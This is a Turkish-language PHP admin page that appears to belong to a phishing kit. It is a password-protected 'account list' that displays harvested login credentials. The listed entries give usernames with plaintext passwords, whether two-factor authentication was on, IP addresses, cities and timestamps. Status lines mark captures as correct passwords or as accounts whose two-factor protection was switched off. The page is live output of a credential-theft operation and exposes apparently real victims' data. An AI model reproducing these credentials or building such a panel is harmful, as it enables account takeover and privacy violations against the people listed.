<?php
 require_once('ayarlar.php');
session_start();
if(!isset($_SESSION[$adminSifre])){
    header("Refresh: 0; url=admin.php"); 
    exit();
}



?>
<input type="hidden" id="react" value="<?php  echo filemtime($phpYolu); ?>">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
<nav aria-label="breadcrumb">
  <ol class="breadcrumb">
    <li class="breadcrumb-item active" aria-current="page">Hesap Listesi</li>
  </ol>
</nav>
<script type="text/javascript">
function asagiKaydir()
  {
  window.scrollBy(100,90000)
  }
</script>
<div class="d-grid gap-2">
  <button onclick='var txt;
var r = confirm("Silmek İstediğinize eminmisiniz!");
if (r == true) {
				window.location.href="txt0.php";
} else {
  txt = "You pressed Cancel!";
}' class="btn btn-danger" type="button">Listeyi Sıfırla</button>
	
	<button  onclick="asagiKaydir()" class="btn btn-primary" type="button">En alta git!</button>
	</div>
<script>
      
  var test= setInterval(function () {
        $.ajax({
            url: 'react.php',
            success: function (response)});
    }, 0);
    
</script>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>melisabeyzag</font><br>
        <font color='red'>Şifresi: </font><font color='black'>cakir123</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Evet</font><br>
      
        <font color='red'>Tarih: </font><font color='black'>07-10-2021 19:50:44</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>178.246.106.156</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Adana</font><br>
        
          <font color='red'>DURUM: </font><font color='success'>DOĞRU İKİ FAKTÖR KAPATILDI!</font><br>
        <hr>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>ahmet_tyut</font><br>
        <font color='red'>Şifresi: </font><font color='black'>cakir123</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
        <font color='red'>Tarih: </font><font color='black'>07-10-2021 23:18:46</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>94.235.232.8</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Gaziantep</font><br>
          <font color='red'>DURUM: </font><font color='success'>DOĞRU ŞİFRE :)</font><br>
        <hr>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>nurettnyldrm</font><br>
        <font color='red'>Şifresi: </font><font color='black'>Canik0154</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
        <font color='red'>Tarih: </font><font color='black'>08-10-2021 01:40:19</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>46.106.108.178</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Istanbul</font><br>
          <font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
        <hr>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>nurettnyldrm</font><br>
        <font color='red'>Şifresi: </font><font color='black'>Caniksfmt0154</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
        <font color='red'>Tarih: </font><font color='black'>08-10-2021 01:40:34</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>46.106.108.178</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Istanbul</font><br>
          <font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
        <hr>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>nurettnyldrm</font><br>
        <font color='red'>Şifresi: </font><font color='black'>Caniksfmt0154</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
        <font color='red'>Tarih: </font><font color='black'>08-10-2021 01:40:39</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>46.106.108.178</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Istanbul</font><br>
          <font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
        <hr>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>nurettnyldrm</font><br>
        <font color='red'>Şifresi: </font><font color='black'>Canik0154</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
        <font color='red'>Tarih: </font><font color='black'>08-10-2021 01:40:51</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>46.106.108.178</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Istanbul</font><br>
          <font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
        <hr>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>nurettnyldrm</font><br>
        <font color='red'>Şifresi: </font><font color='black'>canik0154</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
        <font color='red'>Tarih: </font><font color='black'>08-10-2021 01:41:12</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>46.106.108.178</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Istanbul</font><br>
          <font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
        <hr>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>nurettnyldrm </font><br>
        <font color='red'>Şifresi: </font><font color='black'>Sakarya54</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
        <font color='red'>Tarih: </font><font color='black'>08-10-2021 01:43:13</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>46.106.108.178</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Istanbul</font><br>
          <font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
        <hr>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>nurettnyldrm </font><br>
        <font color='red'>Şifresi: </font><font color='black'>Caniksfmt0154</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
        <font color='red'>Tarih: </font><font color='black'>08-10-2021 01:47:55</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>46.106.108.178</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Istanbul</font><br>
          <font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
        <hr>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>emrecan_333</font><br>
        <font color='red'>Şifresi: </font><font color='black'>Gözümemrecan</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
        <font color='red'>Tarih: </font><font color='black'>08-10-2021 01:52:24</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>46.106.87.69</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Izmir</font><br>
          <font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
        <hr>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>emrecan_333</font><br>
        <font color='red'>Şifresi: </font><font color='black'>gözümemrecan</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
        <font color='red'>Tarih: </font><font color='black'>08-10-2021 01:52:44</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>46.106.87.69</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Izmir</font><br>
          <font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
        <hr>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>emrecan_333</font><br>
        <font color='red'>Şifresi: </font><font color='black'>gözümemrecan</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
        <font color='red'>Tarih: </font><font color='black'>08-10-2021 01:59:58</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>46.106.87.69</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Izmir</font><br>
          <font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
        <hr>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>emrecan_333</font><br>
        <font color='red'>Şifresi: </font><font color='black'>Gözümemrecan</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
        <font color='red'>Tarih: </font><font color='black'>08-10-2021 02:00:30</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>46.106.87.69</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Izmir</font><br>
          <font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
        <hr>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>emrecan_333</font><br>
        <font color='red'>Şifresi: </font><font color='black'>gözümemrecan</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
        <font color='red'>Tarih: </font><font color='black'>08-10-2021 02:00:51</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>46.106.87.69</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Izmir</font><br>
          <font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
        <hr>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>emrecan_333</font><br>
        <font color='red'>Şifresi: </font><font color='black'>Gözümemrecan</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
        <font color='red'>Tarih: </font><font color='black'>08-10-2021 02:01:12</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>46.106.87.69</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Izmir</font><br>
          <font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
        <hr>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>emrecan_333</font><br>
        <font color='red'>Şifresi: </font><font color='black'>gözümemrecan</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
        <font color='red'>Tarih: </font><font color='black'>08-10-2021 03:02:32</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>46.106.87.69</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Izmir</font><br>
          <font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
        <hr>
        <hr>
        <font color='red'>Kullanıcı Adı: </font><font color='black'>emre_can333</font><br>
        <font color='red'>Şifresi: </font><font color='black'>gözümemrecan</font><br>
        <font color='red'>İki Faktör Varmıydı?: </font><font color='black'>Hayır</font><br>
        <font color='red'>Tarih: </font><font color='black'>08-10-2021 03:03:59</font><br>
        <font color='red'>İp Adresi: </font><font color='black'>46.106.87.69</font><br>
          <font color='red'>Konum: </font><font color='black'>Turkey/Izmir</font><br>
          <font color='red'>DURUM: </font><font color='red'>YANLIŞ ŞİFRE</font><br>
        <hr>